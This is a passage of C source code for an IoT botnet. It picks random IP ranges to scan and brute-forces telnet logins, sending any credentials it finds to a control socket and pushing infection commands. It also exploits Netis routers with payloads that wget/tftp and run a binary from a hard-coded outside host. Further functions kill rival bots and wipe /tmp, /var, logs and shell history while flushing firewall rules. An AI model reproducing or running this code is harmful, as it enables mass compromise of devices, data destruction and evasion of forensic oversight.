47,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,251,3,200,248,140,100,100,100,100,103,190,29,70,152,152,152,152,152,210,37,37,37,37,37,37,37,46,46,53,53,53,69,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9};
int Cclass3[] = {245,80,29,117,198,199,28,29,30,184,185,187,250,64,67,220,60,61,63,252,253,254,54,81,6,253,170,147,41,43,218,220,80,211,89,100,101,103,96,97,197,157,49,80,84,242,111,193,192,105,66,171,62,45,1,10,12,14,2,25,3,32,34,35,4,46,51,56,60,61,63,69,78,8,80,86,89,9,0,120,121,122,13,130,131,139,14,140,141,15,16,164,2,20,22,224,225,226,228,231,232,233,234,235,236,237,238,28,29,31,5,6,72,75,76,77,82,9,34,35,52,144,166,242,104,105,106,107,108,109,111,170,171,224,225,226,1,100,101,102,103,104,105,106,107,108,109,11,110,112,113,115,116,118,120,121,122,125,126,127,128,13,142,143,16,168,169,17,171,172,173,176,178,179,18,19,20,21,24,244,247,25,26,27,28,29,30,31,32,34,35,37,60,66,8,96,97,98,99,201,202,203,204,205,206,207,232,32,33,36,38,16,17,19,22,23,82,155,130,184,237,48,7,193,233,162,46,141,109,84,221,119,144,104,191,213,228,185,242,188,26,36,227,131,204,217,130,155,215,100,107,123,127,149,161,171,191,214,34,37,38,59,74,9,122,53,133,51,32,227,232,233,234,235,249,253,254,92,110,131,58,25,146,112,114,120,121,124,172,173,204,206,208,209,210,212,216,217,218,219,223,64,166,253,98,170,177,67,133,117,2,21,61,11,151,161,186,188,212,214,240,28,73,69,126,127,128,131,136,154,158,168,186,249,34,35,76,78,86,90,95,130,53,90,103,210,236,69,2,160,128,138,172,173,174,175,68,69,70,71,136,137,138,139,148,149,150,151,156,157,158,159,208,209,210,211,25,30,31,33,35,140,143,56,58,188,190,191,41,43,180,181,182,183,196,27,29,42,59,144,155,156,158,189,195,203,208,0,131,198,232,152,207,223,248,28,98,109,149,52,57,43,156,145,179,184,33,37,67,92,78,203,240,2,207,62,237,173,178,187,190,161,4,211,219,2,146,18,216,8,105,106,215,10,110,111,114,116,117,12,120,124,128,129,130,133,136,141,143,144,150,151,153,159,16,160,163,169,17,170,173,174,177,178,179,18,181,182,184,187,189,191,194,196,197,198,2,20,200,203,204,206,207,209,210,22,24,243,244,245,246,247,248,25,251,252,254,26,32,34,35,36,37,38,39,4,45,47,5,50,51,52,55,56,58,60,62,63,65,66,69,9,98,10,100,102,103,106,112,128,131,135,137,139,141,15,150,152,167,17,171,174,175,176,177,178,179,18,182,187,188,189,193,194,195,197,2,20,213,214,215,217,218,223,225,226,227,228,23,230,233,237,239,28,29,3,31,33,34,35,37,38,4,41,45,46,47,49,50,52,54,55,59,6,62,66,7,70,71,76,8,81,83,84,87,89,9,91,99,106,108,11,110,115,116,117,12,126,127,128,13,150,152,154,158,159,16,160,162,164,165,167,168,170,172,174,175,184,185,19,191,192,193,194,200,202,203,204,208,21,213,214,216,223,225,227,231,237,239,27,28,30,33,45,46,47,48,51,54,59,61,74,76,77,78,81,84,86,87,95,17,37,74,85,155,157,5,88,52,82,11,15,79,214,240,116,96,3,3,100,106,109,110,113,115,139,172,185,2,211,224,231,38,48,67,1,100,101,103,105,106,108,116,12,121,122,123,128,13,131,135,137,139,14,140,141,144,146,148,150,151,153,154,155,157,158,159,16,163,168,169,17,172,175,177,178,179,18,181,182,185,187,188,189,19,191,193,195,196,199,20,200,203,211,212,214,217,220,222,224,226,229,230,231,233,234,236,237,238,243,245,249,25,254,27,32,34,36,37,39,4,41,43,44,46,49,50,52,53,54,57,59,63,64,65,69,75,76,77,78,79,8,80,81,83,84,85,89,90,93,94,95,98,99,117,31,7,96,108,145,159,187,195,196,242,247,71,160,199,0,100,106,107,11,110,111,112,113,115,116,117,119,132,133,136,14,153,158,16,163,2,206,218,22,223,226,228,234,243,244,246,247,248,249,251,254,26,6,73,98,99,186,183,213,215,228,237,75,209,210,215,225,226,227,229,230,234,242,112,156,158,182,186,189,195,2,211,219,223,27,63,71,90,94,10,100,101,102,105,107,11,110,112,115,116,118,120,122,125,126,130,132,133,134,138,144,147,148,152,160,161,162,166,167,169,179,182,184,185,191,195,20,205,207,208,209,210,212,215,218,219,22,220,222,223,226,227,23,236,24,243,245,27,29,34,37,39,4,41,43,45,5,50,51,55,56,58,59,61,62,64,65,67,69,7,71,76,77,8,85,87,9,93,96,98,10,100,102,110,112,113,114,117,118,122,13,130,133,134,137,138,140,160,162,163,164,165,166,168,17,170,173,179,18,180,184,19,2,247,249,252,29,3,49,50,52,54,6,7,85,92,96,97,98,0,10,104,105,106,107,114,117,127,14,163,166,168,174,177,181,182,183,185,200,206,208,214,220,222,224,226,232,233,24,244,246,248,253,28,29,3,30,31,37,38,4,40,44,45,48,50,52,53,55,56,58,59,60,61,62,63,64,68,7,70,8,84,89,99,160,149,234,126,130,148,156,212,224,247,253,157,244,13,15,32,57,9,44,123,151,165,231,50,70,9,168,169,139,237,239,31,10,101,102,104,108,109,112,117,120,121,123,124,126,128,129,133,136,137,138,139,140,144,145,156,157,158,159,161,167,168,172,174,176,178,179,181,182,185,190,191,192,198,200,207,227,233,239,242,244,245,248,250,253,28,34,36,37,38,39,45,52,57,6,62,65,67,70,74,76,78,79,80,81,86,95};
in_addr_t HackerScan1()
{
int range = rand() % (sizeof(Cclass)/sizeof(char *));
ipState[0] = Cclass[range];
ipState[1] = Cclass2[range];
ipState[2] = Cclass3[range];
ipState[3] = rand() % 255;
char ip[16] = {0};
szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
return inet_addr(ip);
}
in_addr_t HackerScan2()
{
ipState[1] = 0;
ipState[2] = 0;
ipState[3] = 0;
ipState[4] = 0;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
ipState[4] = rand() % 255;
int randnum = rand() % 94;
char ip[16];
if(randnum == 0)
{
szprintf(ip, "112.5.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 1)
{
szprintf(ip, "117.165.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 2)
{
szprintf(ip, "85.3.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 3)
{
szprintf(ip, "37.158.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 4)
{
szprintf(ip, "95.9.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 5)
{
szprintf(ip, "41.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 6)
{
szprintf(ip, "58.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 7)
{
szprintf(ip, "104.55.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 8)
{
szprintf(ip, "78.186.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 9)
{
szprintf(ip, "78.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 10)
{
szprintf(ip, "221.120.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 11)
{
szprintf(ip, "88.5.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 12)
{
szprintf(ip, "41.254.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 13)
{
szprintf(ip, "103.20.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 14)
{
szprintf(ip, "103.47.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 15)
{
szprintf(ip, "103.57.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 16)
{
szprintf(ip, "45.117.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 17)
{
szprintf(ip, "101.51.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 18)
{
szprintf(ip, "137.59.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 19)
{
szprintf(ip, "1.56.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 20)
{
szprintf(ip, "1.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 21)
{
szprintf(ip, "14.204.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 22)
{
szprintf(ip, "27.0.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 23)
{
szprintf(ip, "27.8.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 24)
{
szprintf(ip, "27.50.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 25)
{
szprintf(ip, "27.54.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 26)
{
szprintf(ip, "27.98.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 27)
{
szprintf(ip, "27.112.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 28)
{
szprintf(ip, "27.192.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 29)
{
szprintf(ip, "36.32.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 30)
{
szprintf(ip, "36.248.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 31)
{
szprintf(ip, "39.64.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 32)
{
szprintf(ip, "42.4.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 33)
{
szprintf(ip, "42.48.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 34)
{
szprintf(ip, "42.52.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 35)
{
szprintf(ip, "42.56.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 36)
{
szprintf(ip, "42.63.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 37)
{
szprintf(ip, "42.84.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 38)
{
szprintf(ip, "42.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 39)
{
szprintf(ip, "42.224.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 40)
{
szprintf(ip, "42.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 41)
{
szprintf(ip, "60.0.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 42)
{
szprintf(ip, "60.16.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 43)
{
szprintf(ip, "163.53.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 44)
{
szprintf(ip, "62.30.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 45)
{
szprintf(ip, "62.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 46)
{
szprintf(ip, "62.254.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 47)
{
szprintf(ip, "62.255.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 48)
{
szprintf(ip, "77.96.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 49)
{
szprintf(ip, "77.97.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 50)
{
szprintf(ip, "77.98.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 51)
{
szprintf(ip, "77.100.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 52)
{
szprintf(ip, "77.102.%d.%d", ipState[3], ipState[4]);
}
if(randnum ==53)
{
szprintf(ip, "113.191.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 54)
{
szprintf(ip, "81.100.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 55)
{
szprintf(ip, "113.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 56)
{
szprintf(ip, "113.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 57)
{
szprintf(ip, "94.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 58)
{
szprintf(ip, "14.160.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 59)
{
szprintf(ip, "14.161.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 60)
{
szprintf(ip, "14.162.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 61)
{
szprintf(ip, "14.163.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 62)
{
szprintf(ip, "14.164.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 63)
{
szprintf(ip, "14.165.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 64)
{
szprintf(ip, "14.166.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 65)
{
szprintf(ip, "14.167.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 66)
{
szprintf(ip, "14.168.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 67)
{
szprintf(ip, "14.169.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 68)
{
szprintf(ip, "14.170.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 69)
{
szprintf(ip, "14.171.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 70)
{
szprintf(ip, "14.172.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 71)
{
szprintf(ip, "14.173.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 72)
{
szprintf(ip, "14.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 73)
{
szprintf(ip, "14.175.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 74)
{
szprintf(ip, "14.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 75)
{
szprintf(ip, "14.177.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 76)
{
szprintf(ip, "14.178.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 77)
{
szprintf(ip, "14.179.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 78)
{
szprintf(ip, "14.180.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 79)
{
szprintf(ip, "14.181.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 80)
{
szprintf(ip, "14.182.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 81)
{
szprintf(ip, "14.183.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 82)
{
szprintf(ip, "14.184.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 83)
{
szprintf(ip, "14.185.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 84)
{
szprintf(ip, "14.186.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 85)
{
szprintf(ip, "14.187.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 86)
{
szprintf(ip, "14.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 87)
{
szprintf(ip, "14.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 88)
{
szprintf(ip, "14.190.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 89)
{
szprintf(ip, "14.191.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 90)
{
szprintf(ip, "45.121.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 91)
{
szprintf(ip, "45.120.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 92)
{
szprintf(ip, "45.115.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 93)
{//if you hit these ranges right here then easy 5k
szprintf(ip, "43.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 94)
{
szprintf(ip, "43.230.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 95)
{
szprintf(ip, "43.240.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 96)
{
szprintf(ip, "43.245.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 97)
{
szprintf(ip, "41.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 98)
{
szprintf(ip, "49.118.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 99)
{
szprintf(ip, "78.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 100)
{
szprintf(ip, "45.127.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 101)
{
szprintf(ip, "103.30.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 102)
{
szprintf(ip, "14.33.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 103)
{
szprintf(ip, "123.16.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 104)
{
szprintf(ip, "202.44.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 105)
{
szprintf(ip, "116.93.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 106)
{
szprintf(ip, "91.83.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 107)
{
szprintf(ip, "41.253.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 108)
{
szprintf(ip, "117.173.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 109)
{
szprintf(ip, "113.190.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 110)
{
szprintf(ip, "146.88.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 111)
{
szprintf(ip, "112.196.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 112)
{
szprintf(ip, "113.178.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 113)
{
szprintf(ip, "112.45.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 114)
{
szprintf(ip, "183.223.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 115)
{
szprintf(ip, "116.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 116)
{
szprintf(ip, "183.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 117)
{
szprintf(ip, "192.168.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 118)
{
szprintf(ip, "89.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 119)
{
szprintf(ip, "244.77.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 120)
{
szprintf(ip, "179.105.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 121)
{
szprintf(ip, "125.27.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 122)
{
szprintf(ip, "189.29.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 123)
{
szprintf(ip, "103.57.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 124)
{
szprintf(ip, "189.35.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 125)
{
szprintf(ip, "189.4.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 126)
{
szprintf(ip, "101.105.%d.%d", ipState[3], ipState[4]);
}
return inet_addr(ip);
}
int rangechoice = 1;
in_addr_t findARandomIP()
{
if(rangechoice < 1 || rangechoice > 2){
return hackeroriginal();
}else{
if(rangechoice == 1){
return HackerScan2();
}else if(rangechoice == 2){
return HackerScan1();
}
}
}
in_addr_t HackerScan(in_addr_t netmask)
{
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count)
{
register uint64_t sum = 0;
while( count > 1 ) { sum += *buf++; count -= 2; }
if(count > 0) { sum += *(unsigned char *)buf; }
while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
struct tcp_pseudo
{
unsigned long src_addr;
unsigned long dst_addr;
unsigned char zero;
unsigned char proto;
unsigned short length;
} pseudohead;
unsigned short total_len = iph->tot_len;
pseudohead.src_addr=iph->saddr;
pseudohead.dst_addr=iph->daddr;
pseudohead.zero=0;
pseudohead.proto=IPPROTO_TCP;
pseudohead.length=htons(sizeof(struct tcphdr));
int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
unsigned short *tcp = malloc(totaltcp_len);
memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
unsigned short output = csum(tcp,totaltcp_len);
free(tcp);
return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
iph->ihl = 5;
iph->version = 4;
iph->tos = 0;
iph->tot_len = sizeof(struct iphdr) + packetSize;
iph->id = rand_cmwc();
iph->frag_off = 0;
iph->ttl = MAXTTL;
iph->protocol = protocol;
iph->check = 0;
iph->saddr = source;
iph->daddr = dest;
}
int sclose(int fd)
{
if(3 > fd) return 1;
close(fd);
return 0;
}
void StartTheLelz()
{
int i, res, j;
char buf[128], cur_dir;
int wait_usec = 10;
int maxfds = 1000;
int max = maxfds;
fd_set fdset;
struct timeval tv;
socklen_t lon;
int valopt;
srand(time(NULL) ^ rand_cmwc());
char line[256];
char* buffer;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
buffer = malloc(BUFFER_SIZE + 1);
memset(buffer, 0, BUFFER_SIZE + 1);
struct telstate_t fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
for(i = 0; i < max; i++)
{
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].complete = 1;
fds[i].sockbuf = buffer;
}
while(1) {
for(i = 0; i < max; i++)
{
if(fds[i].totalTimeout == 0)
{
fds[i].totalTimeout = time(NULL);
}
switch(fds[i].state)
{
case 0:
{
if(fds[i].complete == 1)
{
// clear the current fd
char *tmp = fds[i].sockbuf;
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].sockbuf = tmp;
// get a new random ip
fds[i].ip = HackerScan2();
fds[i].ip = HackerScan1();
}
else if(fds[i].complete == 0)
{
fds[i].passwordInd++;
fds[i].usernameInd++;
if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *))
{
fds[i].complete = 1;
continue;
}
if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *))
{
fds[i].complete = 1;
continue;
}
}
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
dest_addr.sin_addr.s_addr = fds[i].ip;
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
if(fds[i].fd == -1) continue;
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
{
reset_telstate(&fds[i]);
}
else
{
advance_state(&fds[i], 1);
}
}
break;
case 1:
{
FD_ZERO(&fdset);
FD_SET(fds[i].fd, &fdset);
tv.tv_sec = 0;
tv.tv_usec = wait_usec;
res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
if(res == 1)
{
lon = sizeof(int);
valopt = 0;
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt)
{
reset_telstate(&fds[i]);
}
else
{
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
advance_state(&fds[i], 2);
}
continue;
}
else if(res == -1)
{
reset_telstate(&fds[i]);
continue;
}
if(fds[i].totalTimeout + 6 < time(NULL))
{
reset_telstate(&fds[i]);
}
}
break;
case 2:
{
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances))
{
if(contains_fail(fds[i].sockbuf))
{
advance_state(&fds[i], 0);
}
else
{
advance_state(&fds[i], 3);
}
continue;
}
if(fds[i].totalTimeout + 6 < time(NULL))
{
reset_telstate(&fds[i]);
}
}
break;
case 3:
{
if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
{
reset_telstate(&fds[i]);
continue;
}
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
{
reset_telstate(&fds[i]);
continue;
}
advance_state(&fds[i], 4);
}
break;
case 4:
{
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances))
{
if(contains_fail(fds[i].sockbuf))
{
advance_state(&fds[i], 0);
}
else
{
advance_state(&fds[i], 5);
}
continue;
}
if(fds[i].totalTimeout + 6 < time(NULL))
{
reset_telstate(&fds[i]);
}
}
break;
case 5:
{
if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
{
reset_telstate(&fds[i]);
continue;
}
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
{
reset_telstate(&fds[i]);
continue;
}
advance_state(&fds[i], 6);
}
break;
case 6:
{
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2))
{
fds[i].totalTimeout = time(NULL);
if(contains_fail(fds[i].sockbuf))
{
advance_state(&fds[i], 0);
}
else if(contains_success(fds[i].sockbuf))
{
if(fds[i].complete == 2)
{
advance_state(&fds[i], 7);
}
else
{
sockprintf(mainCommSock, "LOGIN FOUND - %s:%s:%s\x1b[0m", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
advance_state(&fds[i], 7);
}
}
else
{
reset_telstate(&fds[i]);
}
continue;
}
if(fds[i].totalTimeout + 7 < time(NULL))
{
reset_telstate(&fds[i]);
}
}
break;
case 7:
{
fds[i].totalTimeout = time(NULL);
if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0);
if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0);
if(send(fds[i].fd, infect1, strlen(infect1), MSG_NOSIGNAL) < 0)
if(send(fds[i].fd, infect2, strlen(infect2), MSG_NOSIGNAL) < 0)
if(send(fds[i].fd, infect3, strlen(infect3), MSG_NOSIGNAL) < 0)
if(send(fds[i].fd, infect4, strlen(infect4), MSG_NOSIGNAL) < 0)
{
reset_telstate(&fds[i]);
continue;
}
fds[i].complete = 3;
if(fds[i].totalTimeout + 55 < time(NULL))
{
if(fds[i].complete !=3){
}
reset_telstate(&fds[i]);
}
break;
}
}
}
}
}
// netis scanner 
void StartTheNetis()
{
while(1){
int netisSocket;
struct sockaddr_in serverAddr;
socklen_t addr_size;
netisSocket = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
serverAddr.sin_family = AF_INET;
serverAddr.sin_port = htons(53413);
serverAddr.sin_addr.s_addr = HackerScan2();serverAddr.sin_addr.s_addr = HackerScan1();
addr_size = sizeof serverAddr;
memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);
char* payloadOne = "AAAAAAAAnetcore\x00";
//char* payloadTwo = "AA\x00\x00AAAA cd /var/; rm -rf mipsel; wget http://5.206.225.25/mipsel || tftp -r mipsel -g 5.206.225.25; chmod 777 mipsel; ./mipsel; rm -rf mipsel\x00";
char* payloadTwo = "AA\\x00\\x00AAAA cd /var/; rm -rf mipsel; wget http://5.206.225.25/mipsel || tftp -r mipsel -g 5.206.225.25; chmod 777 mipsel; ./mipsel; rm -rf mipsel";
//char* payloadThree = "AA\x00\x00AAAA cd /var/; rm -rf mipsel; wget http://5.206.225.25/bins.sh;http://5.206.225.25/bin.sh || tftp -r bin.sh -g 5.206.225.25;tftp -r bins.sh -g 5.206.225.25; chmod 777 mipsel; ./bins;./bin; rm -rf bins.sh;rm -rf bin.sh\x00";
char* payloadThree = "AA\\x00\\x00AAAA cd /var/; rm -rf mipsel; wget http://5.206.225.25/bins.sh;http://5.206.225.25/bin.sh || tftp -r bin.sh -g 5.206.225.25;tftp -r bins.sh -g 5.206.225.25; chmod 777 mipsel; ./bins;./bin; rm -rf bins.sh;rm -rf bin.sh";
sendto(netisSocket, payloadOne, strlen(payloadOne), 0, (struct sockaddr_in *) &serverAddr, sizeof(serverAddr));
sendto(netisSocket, payloadTwo, strlen(payloadTwo), 0, (struct sockaddr_in *) &serverAddr, sizeof(serverAddr));
sendto(netisSocket, payloadThree, strlen(payloadThree), 0, (struct sockaddr_in *) &serverAddr, sizeof(serverAddr));
close(netisSocket);
}
}

void botkiller(){
int i;
while(1){
for(i = 0; i < 9; i++){
sprintf(hacker, "pkill -9 ");
strcat(hacker, Boats[i]);
system(hacker);
sprintf(hacker, "pkill -9 \"");
strcat(hacker, Boats[i]);
strcat(hacker, "\"");
system(hacker);
sprintf(botkill, "pkill -9 %s\r\n", bots[i]);
if(send(strlen, botkill, strlen(botkill), MSG_NOSIGNAL) < 0)
sleep(5);
return;
}
}
}
void RemoveTMP() {
	system("rm -rf /tmp/* /var/* /var/run/* /var/tmp/*"); 
	system("rm -rf /var/log/wtmp");
	system("history -c;history -w");
    system("rm -rf /var/log/wtmp");
	system("rm -rf /tmp/*");
	system("history -c");
	system("rm -rf ~/.bash_history");
	system("rm -rf /bin/netstat");
	system("history -w");
	system("pkill -9 busybox");
	system("pkill -9 perl");
	system("service iptables stop");
	system("/sbin/iptables -F;/sbin/iptables -X");
}

int socket_connect(char *host, in_port_t port) {
struct hostent *hp;
struct sockaddr_in addr;
int on = 1, sock;
if ((hp = gethostbyname(host)) == NULL) return 0;
bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);
addr.sin_family = AF_INET;
sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
if (sock == -1) return 0;
if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
return 0;
return sock;
